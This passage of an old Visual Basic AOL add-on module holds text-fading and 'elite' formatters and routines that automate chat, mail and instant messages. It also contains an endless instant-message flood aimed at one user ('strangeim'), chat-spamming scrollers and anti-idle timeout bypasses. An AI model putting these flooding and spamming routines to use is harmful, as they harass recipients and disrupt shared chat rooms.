            If o2 = 3 Then Msg = Msg + "<SUP>"
            Msg = Msg + Mid$(text, X, 1)
            If o2 = 1 Then Msg = Msg + "</SUB>"
            If o2 = 3 Then Msg = Msg + "</SUP>"
            If Q2 = 2 Then
                Q = 1
                Q2 = 1
                If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
                If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
                If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
                If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
            End If
        ElseIf WavY = False Then
            Msg = Msg + Mid$(text, X, 1)
            If Q2 = 2 Then
            Q = 1
            Q2 = 1
            If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
            If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
            If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
            If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
        End If
        End If
nc:     Next X
    c1 = C1BAK
    c2 = C2BAK
    c3 = C3BAK
    c4 = C4BAK
    BoldSendChat (Msg)
End Function

Function ThreeColors(text As String, Red1, Green1, Blue1, Red2, Green2, Blue2, Red3, Green3, Blue3, WavY As Boolean)

'This code is still buggy, use at your own risk

    D = Len(text)
        If D = 0 Then GoTo TheEnd
        If D = 1 Then Fade1 = text
    For X = 2 To 500 Step 2
        If D = X Then GoTo Evens
    Next X
    For X = 3 To 501 Step 2
        If D = X Then GoTo Odds
    Next X
Evens:
    c = D \ 2
    Fade1 = Left(text, c)
    Fade2 = Right(text, c)
    GoTo TheEnd
Odds:
    c = D \ 2
    Fade1 = Left(text, c)
    Fade2 = Right(text, c + 1)
TheEnd:
    LA1 = Fade1
    LA2 = Fade2
        If WavY = True Then FadeA = TwoColors(Left(LA1, Len(LA1) - 1), Red1, Green1, Blue1, Red2, Green2, Blue2, True) + TwoColors(Right(LA1, 1), Red2, Green2, Blue2, Red2, Green2, Blue2, True)
        If WavY = False Then FadeA = TwoColors(Left(LA1, Len(LA1) - 1), Red1, Green1, Blue1, Red2, Green2, Blue2, False) + TwoColors(Right(LA1, 1), Red2, Green2, Blue2, Red2, Green2, Blue2, False)
        If WavY = True Then FadeB = TwoColors(Left(LA2, Len(LA2) - 1), Red2, Green2, Blue2, Red3, Green3, Blue3, True) + TwoColors(Right(LA2, 1), Red3, Green3, Blue3, Red3, Green3, Blue3, True)
        If WavY = False Then FadeB = TwoColors(Left(LA2, Len(LA2) - 1), Red2, Green2, Blue2, Red3, Green3, Blue3, False) + TwoColors(Right(LA2, 1), Red3, Green3, Blue3, Red3, Green3, Blue3, False)
    Msg = FadeA + FadeB
  BoldSendChat (Msg)
End Function

Function RGB2HEX(r, G, b)
    Dim X&
    Dim XX&
    Dim Color&
    Dim Divide
    Dim Answer&
    Dim Remainder&
    Dim Configuring$
    For X& = 1 To 3
        If X& = 1 Then Color& = b
        If X& = 2 Then Color& = G
        If X& = 3 Then Color& = r
        For XX& = 1 To 2
            Divide = Color& / 16
            Answer& = Int(Divide)
            Remainder& = (10000 * (Divide - Answer&)) / 625
            If Remainder& < 10 Then Configuring$ = Str(Remainder&) + Configuring$
            If Remainder& = 10 Then Configuring$ = "A" + Configuring$
            If Remainder& = 11 Then Configuring$ = "B" + Configuring$
            If Remainder& = 12 Then Configuring$ = "C" + Configuring$
            If Remainder& = 13 Then Configuring$ = "D" + Configuring$
            If Remainder& = 14 Then Configuring$ = "E" + Configuring$
            If Remainder& = 15 Then Configuring$ = "F" + Configuring$
            Color& = Answer&
        Next XX&
    Next X&
    Configuring$ = TrimSpaces(Configuring$)
    RGB2HEX = Configuring$
End Function

Function TrimSpaces(text)
    If InStr(text, " ") = 0 Then
    TrimSpaces = text
    Exit Function
    End If
    For TrimSpace = 1 To Len(text)
    thechar$ = Mid(text, TrimSpace, 1)
    thechars$ = thechars$ & thechar$
    If thechar$ = " " Then
    thechars$ = Mid(thechars$, 1, Len(thechars$) - 1)
    End If
    Next TrimSpace
    TrimSpaces = thechars$
End Function


Function FindChildByClass(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
FindChildByClass = 0

bone:
room% = firs%
FindChildByClass = room%

End Function
Function Bold_italic_colorR_Backwards(strin As String)
'Returns the strin backwards
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let newsent$ = nextchr$ & newsent$
Loop
BoldRedBlackRed (newsent$)
End Function


Function r_elite2(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If crapp% > 0 Then GoTo Greed

If nextchr$ = "A" Then Let nextchr$ = "/\"
If nextchr$ = "a" Then Let nextchr$ = "å"
If nextchr$ = "B" Then Let nextchr$ = "ß"
If nextchr$ = "C" Then Let nextchr$ = "Ç"
If nextchr$ = "c" Then Let nextchr$ = "¢"
If nextchr$ = "D" Then Let nextchr$ = "Ð"
If nextchr$ = "d" Then Let nextchr$ = "ð"
If nextchr$ = "E" Then Let nextchr$ = "Ê"
If nextchr$ = "e" Then Let nextchr$ = "è"
If nextchr$ = "f" Then Let nextchr$ = "ƒ"
If nextchr$ = "H" Then Let nextchr$ = "|-|"
If nextchr$ = "I" Then Let nextchr$ = "‡"
If nextchr$ = "i" Then Let nextchr$ = "î"
If nextchr$ = "k" Then Let nextchr$ = "|‹"
If nextchr$ = "L" Then Let nextchr$ = "£"
If nextchr$ = "M" Then Let nextchr$ = "]V["
If nextchr$ = "m" Then Let nextchr$ = "^^"
If nextchr$ = "N" Then Let nextchr$ = "/\/"
If nextchr$ = "n" Then Let nextchr$ = "ñ"
If nextchr$ = "O" Then Let nextchr$ = "Ø"
If nextchr$ = "o" Then Let nextchr$ = "ö"
If nextchr$ = "P" Then Let nextchr$ = "¶"
If nextchr$ = "p" Then Let nextchr$ = "Þ"
If nextchr$ = "r" Then Let nextchr$ = "®"
If nextchr$ = "S" Then Let nextchr$ = "§"
If nextchr$ = "s" Then Let nextchr$ = "$"
If nextchr$ = "t" Then Let nextchr$ = "†"
If nextchr$ = "U" Then Let nextchr$ = "Ú"
If nextchr$ = "u" Then Let nextchr$ = "µ"
If nextchr$ = "V" Then Let nextchr$ = "\/"
If nextchr$ = "W" Then Let nextchr$ = "VV"
If nextchr$ = "w" Then Let nextchr$ = "vv"
If nextchr$ = "X" Then Let nextchr$ = "X"
If nextchr$ = "x" Then Let nextchr$ = "×"
If nextchr$ = "Y" Then Let nextchr$ = "¥"
If nextchr$ = "y" Then Let nextchr$ = "ý"
If nextchr$ = "!" Then Let nextchr$ = "¡"
If nextchr$ = "?" Then Let nextchr$ = "¿"
If nextchr$ = "." Then Let nextchr$ = "…"
If nextchr$ = "," Then Let nextchr$ = "‚"
If nextchr$ = "1" Then Let nextchr$ = "¹"
If nextchr$ = "%" Then Let nextchr$ = "‰"
If nextchr$ = "2" Then Let nextchr$ = "²"
If nextchr$ = "3" Then Let nextchr$ = "³"
If nextchr$ = "_" Then Let nextchr$ = "¯"
If nextchr$ = "-" Then Let nextchr$ = "—"
If nextchr$ = " " Then Let nextchr$ = " "
If nextchr$ = "<" Then Let nextchr$ = "«"
If nextchr$ = ">" Then Let nextchr$ = "»"
If nextchr$ = "*" Then Let nextchr$ = "¤"
If nextchr$ = "`" Then Let nextchr$ = "“"
If nextchr$ = "'" Then Let nextchr$ = "”"
If nextchr$ = "0" Then Let nextchr$ = "º"
Let newsent$ = newsent$ + nextchr$

Greed:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop

BoldBlackBlueBlack (newsent$)

End Function

Function R_Elite(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If crapp% > 0 Then GoTo Greed

If nextchr$ = "A" Then Let nextchr$ = "/\"
If nextchr$ = "a" Then Let nextchr$ = "å"
If nextchr$ = "B" Then Let nextchr$ = "ß"
If nextchr$ = "C" Then Let nextchr$ = "Ç"
If nextchr$ = "c" Then Let nextchr$ = "¢"
If nextchr$ = "D" Then Let nextchr$ = "Ð"
If nextchr$ = "d" Then Let nextchr$ = "ð"
If nextchr$ = "E" Then Let nextchr$ = "Ê"
If nextchr$ = "e" Then Let nextchr$ = "è"
If nextchr$ = "f" Then Let nextchr$ = "ƒ"
If nextchr$ = "H" Then Let nextchr$ = "|-|"
If nextchr$ = "I" Then Let nextchr$ = "‡"
If nextchr$ = "i" Then Let nextchr$ = "î"
If nextchr$ = "k" Then Let nextchr$ = "|‹"
If nextchr$ = "L" Then Let nextchr$ = "£"
If nextchr$ = "M" Then Let nextchr$ = "]V["
If nextchr$ = "m" Then Let nextchr$ = "^^"
If nextchr$ = "N" Then Let nextchr$ = "/\/"
If nextchr$ = "n" Then Let nextchr$ = "ñ"
If nextchr$ = "O" Then Let nextchr$ = "Ø"
If nextchr$ = "o" Then Let nextchr$ = "ö"
If nextchr$ = "P" Then Let nextchr$ = "¶"
If nextchr$ = "p" Then Let nextchr$ = "Þ"
If nextchr$ = "r" Then Let nextchr$ = "®"
If nextchr$ = "S" Then Let nextchr$ = "§"
If nextchr$ = "s" Then Let nextchr$ = "$"
If nextchr$ = "t" Then Let nextchr$ = "†"
If nextchr$ = "U" Then Let nextchr$ = "Ú"
If nextchr$ = "u" Then Let nextchr$ = "µ"
If nextchr$ = "V" Then Let nextchr$ = "\/"
If nextchr$ = "W" Then Let nextchr$ = "VV"
If nextchr$ = "w" Then Let nextchr$ = "vv"
If nextchr$ = "X" Then Let nextchr$ = "X"
If nextchr$ = "x" Then Let nextchr$ = "×"
If nextchr$ = "Y" Then Let nextchr$ = "¥"
If nextchr$ = "y" Then Let nextchr$ = "ý"
If nextchr$ = "!" Then Let nextchr$ = "¡"
If nextchr$ = "?" Then Let nextchr$ = "¿"
If nextchr$ = "." Then Let nextchr$ = "…"
If nextchr$ = "," Then Let nextchr$ = "‚"
If nextchr$ = "1" Then Let nextchr$ = "¹"
If nextchr$ = "%" Then Let nextchr$ = "‰"
If nextchr$ = "2" Then Let nextchr$ = "²"
If nextchr$ = "3" Then Let nextchr$ = "³"
If nextchr$ = "_" Then Let nextchr$ = "¯"
If nextchr$ = "-" Then Let nextchr$ = "—"
If nextchr$ = " " Then Let nextchr$ = " "
If nextchr$ = "<" Then Let nextchr$ = "«"
If nextchr$ = ">" Then Let nextchr$ = "»"
If nextchr$ = "*" Then Let nextchr$ = "¤"
If nextchr$ = "`" Then Let nextchr$ = "“"
If nextchr$ = "'" Then Let nextchr$ = "”"
If nextchr$ = "0" Then Let nextchr$ = "º"
Let newsent$ = newsent$ + nextchr$

Greed:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop

BoldBlackBlueBlack (newsent$)

End Function
Function R_Hacker(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
If nextchr$ = "A" Then Let nextchr$ = "a"
If nextchr$ = "E" Then Let nextchr$ = "e"
If nextchr$ = "I" Then Let nextchr$ = "i"
If nextchr$ = "O" Then Let nextchr$ = "o"
If nextchr$ = "U" Then Let nextchr$ = "u"
If nextchr$ = "b" Then Let nextchr$ = "B"
If nextchr$ = "c" Then Let nextchr$ = "C"
If nextchr$ = "d" Then Let nextchr$ = "D"
If nextchr$ = "z" Then Let nextchr$ = "Z"
If nextchr$ = "f" Then Let nextchr$ = "F"
If nextchr$ = "g" Then Let nextchr$ = "G"
If nextchr$ = "h" Then Let nextchr$ = "H"
If nextchr$ = "y" Then Let nextchr$ = "Y"
If nextchr$ = "j" Then Let nextchr$ = "J"
If nextchr$ = "k" Then Let nextchr$ = "K"
If nextchr$ = "l" Then Let nextchr$ = "L"
If nextchr$ = "m" Then Let nextchr$ = "M"
If nextchr$ = "n" Then Let nextchr$ = "N"
If nextchr$ = "x" Then Let nextchr$ = "X"
If nextchr$ = "p" Then Let nextchr$ = "P"
If nextchr$ = "q" Then Let nextchr$ = "Q"
If nextchr$ = "r" Then Let nextchr$ = "R"
If nextchr$ = "s" Then Let nextchr$ = "S"
If nextchr$ = "t" Then Let nextchr$ = "T"
If nextchr$ = "w" Then Let nextchr$ = "W"
If nextchr$ = "v" Then Let nextchr$ = "V"
If nextchr$ = " " Then Let nextchr$ = " "
Let newsent$ = newsent$ + nextchr$
Loop
BoldYellowBlack (newsent$)


End Function
Function R_Hacker2(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
If nextchr$ = "A" Then Let nextchr$ = "a"
If nextchr$ = "E" Then Let nextchr$ = "e"
If nextchr$ = "I" Then Let nextchr$ = "i"
If nextchr$ = "O" Then Let nextchr$ = "o"
If nextchr$ = "U" Then Let nextchr$ = "u"
If nextchr$ = "b" Then Let nextchr$ = "B"
If nextchr$ = "c" Then Let nextchr$ = "C"
If nextchr$ = "d" Then Let nextchr$ = "D"
If nextchr$ = "z" Then Let nextchr$ = "Z"
If nextchr$ = "f" Then Let nextchr$ = "F"
If nextchr$ = "g" Then Let nextchr$ = "G"
If nextchr$ = "h" Then Let nextchr$ = "H"
If nextchr$ = "y" Then Let nextchr$ = "Y"
If nextchr$ = "j" Then Let nextchr$ = "J"
If nextchr$ = "k" Then Let nextchr$ = "K"
If nextchr$ = "l" Then Let nextchr$ = "L"
If nextchr$ = "m" Then Let nextchr$ = "M"
If nextchr$ = "n" Then Let nextchr$ = "N"
If nextchr$ = "x" Then Let nextchr$ = "X"
If nextchr$ = "p" Then Let nextchr$ = "P"
If nextchr$ = "q" Then Let nextchr$ = "Q"
If nextchr$ = "r" Then Let nextchr$ = "R"
If nextchr$ = "s" Then Let nextchr$ = "S"
If nextchr$ = "t" Then Let nextchr$ = "T"
If nextchr$ = "w" Then Let nextchr$ = "W"
If nextchr$ = "v" Then Let nextchr$ = "V"
If nextchr$ = " " Then Let nextchr$ = " "
Let newsent$ = newsent$ + nextchr$
Loop
BoldBlackBlueBlack2 (newsent$)


End Function
Function R_Spaced2(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchr$ = nextchr$ + " "
Let newsent$ = newsent$ + nextchr$
Loop
 RedBlackRed2 (newsent$)

End Function

Function R_Spaced(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchr$ = nextchr$ + " "
Let newsent$ = newsent$ + nextchr$
Loop
 BoldRedBlackRed (newsent$)

End Function
Function FindChildByTitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
FindChildByTitle = 0

bone:
room% = firs%
FindChildByTitle = room%
End Function

Function GetClass(child)
Buffer$ = String$(250, 0)
getclas% = GetClassName(child, Buffer$, 250)

GetClass = Buffer$
End Function

Function FindChatRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
room% = FindChildByClass(MDI%, "AOL Child")
STUFF% = FindChildByClass(room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(room%, "RICHCNTL")
If STUFF% <> 0 And MoreStuff% <> 0 Then
   FindChatRoom = room%
Else:
   FindChatRoom = 0
End If
End Function



Function IsUserOnline()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome,")
If welcome% <> 0 Then
   IsUserOnline = 1
Else:
   IsUserOnline = 0
End If
End Function


Sub SendChat(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
Call SetFocusAPI(room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub

Sub TimeOut(Duration)
starttime = Timer
Do While Timer - starttime < Duration
DoEvents
Loop

End Sub

Sub StayOnTop(TheForm As Form)
SetWinOnTop = SetWindowPos(TheForm.hWnd, HWND_TOPMOST, 0, 0, 0, 0, flags)
End Sub


Sub Anti45MinTimer()
'use this sub in a timer set at 100
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
AoIcon% = FindChildByClass(AOTimer%, "_AOL_Icon")
ClickIcon (AoIcon%)
End Sub
Sub AntiIdle()
'use this sub in a timer set at 100
AOModal% = FindWindow("_AOL_Modal", vbNullString)
AoIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AoIcon%)
End Sub
Sub ClickIcon(icon%)
Clck% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Clck% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub SendMail2(Recipiants, Subject, Message)

AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AoIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AoIcon% = GetWindow(AoIcon%, 2)

ClickIcon (AoIcon%)

Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
AOMail% = FindChildByTitle(MDI%, "Write Mail")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AoIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AoIcon% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Subject)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Message)

For GetIcon = 1 To 18
    AoIcon% = GetWindow(AoIcon%, 2)
Next GetIcon

ClickIcon (AoIcon%)

Do: DoEvents
AOError% = FindChildByTitle(MDI%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AoIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AoIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub


Sub Keyword(Keyword As String)
    AOL% = FindWindow("AOL Frame25", vbNullString)
    temp% = FindChildByClass(AOL%, "AOL Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Combobox")
    KWBox% = FindChildByClass(temp%, "Edit")
    Call SendMessageByString(KWBox%, WM_SETTEXT, 0, Txt)
    Call SendMessageByNum(KWBox%, WM_CHAR, VK_SPACE, 0)
    Call SendMessageByNum(KWBox%, WM_CHAR, VK_RETURN, 0)
End Sub

Function BoldAOL4_WavColors(Text1 As String)
G$ = Text1
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & T$
Next W
SendChat (p$)
End Function
Function AOL4_WavColors3(Text1 As String)

End Function
Sub IMBuddy(Recipiant, Message)

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
buddy% = FindChildByTitle(MDI%, "Buddy List Window")

If buddy% = 0 Then
    Keyword ("BuddyView")
    Do: DoEvents
    Loop Until buddy% <> 0
End If

AoIcon% = FindChildByClass(buddy%, "_AOL_Icon")

For l = 1 To 2
    AoIcon% = GetWindow(AoIcon%, 2)
Next l

Call TimeOut(0.01)
ClickIcon (AoIcon%)

Do: DoEvents
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
AoIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AoIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Message)

For X = 1 To 9
    AoIcon% = GetWindow(AoIcon%, 2)
Next X

Call TimeOut(0.01)
ClickIcon (AoIcon%)

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub
Sub IMKeyword(Recipiant, Message)

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

Call Keyword("aol://9293:")

Do: DoEvents
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
AoIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AoIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Message)

For X = 1 To 9
    AoIcon% = GetWindow(AoIcon%, 2)
Next X

Call TimeOut(0.01)
ClickIcon (AoIcon%)

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub

Function GetText(child)
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)
GetText = TrimSpace$
End Function

Function GetChatText()
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")
ChatText = GetText(AORich%)
GetChatText = ChatText
End Function

Function LastChatLineWithSN()
'duh this will get the text from
'the last chatline with the sn
' used in many bots and shit like that
ChatText$ = GetChatText

For FindChar = 1 To Len(ChatText$)

thechar$ = Mid(ChatText$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
TheChatText$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
lastline = Mid(ChatText$, lastlen, Len(thechars$))

LastChatLineWithSN = lastline
End Function

Function SNFromLastChatLine()
ChatText$ = LastChatLineWithSN
ChatTrim$ = Left$(ChatText$, 11)
For Z = 1 To 11
    If Mid$(ChatTrim$, Z, 1) = ":" Then
        SN = Left$(ChatTrim$, Z - 1)
    End If
Next Z
SNFromLastChatLine = SN
End Function

Function LastChatLine()
'duh this will get the text from
'the last chatline , used in many
'bots and shit like that
ChatText = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(ChatText, ChatTrimNum + 4, Len(ChatText) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function

Sub AddRoomToListbox(ListBox As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
TheList.Clear

room = FindChatRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal person$, 4)
ListPersonHold = ListPersonHold + 6

person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, person$, Len(person$), ReadBytes)

person$ = Left$(person$, InStr(person$, vbNullChar) - 1)
If person$ = UserSN Then GoTo Na
mmer.Label2.Caption = mmer.Label2.Caption + 1
ListBox.AddItem person$
Na:
Next Index
Call CloseHandle(AOLProcessThread)
End If

End Sub
Sub strangeim(STUFF)
'I can't rember where I got this
'sub from but this is not one of mine
'thanxz to who ever I got it from
Do:
DoEvents
Call IMKeyword(STUFF, "<body bgcolor=#000000>")
Call IMKeyword(STUFF, "<body bgcolor=#0000FF>")
Call IMKeyword(STUFF, "<body bgcolor=#FF0000>")
Call IMKeyword(STUFF, "<body bgcolor=#00FF00>")
Call IMKeyword(STUFF, "<body bgcolor=#C0C0C0>")
Loop 'This will loop untill a stop button is pressed.
End Sub

Public Sub AOLEightLine(Txt As TextBox)
'a simple 8 line scroller
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""

SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""

SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""

SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 2

End Sub


Public Sub AOLFifteenLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 1.5
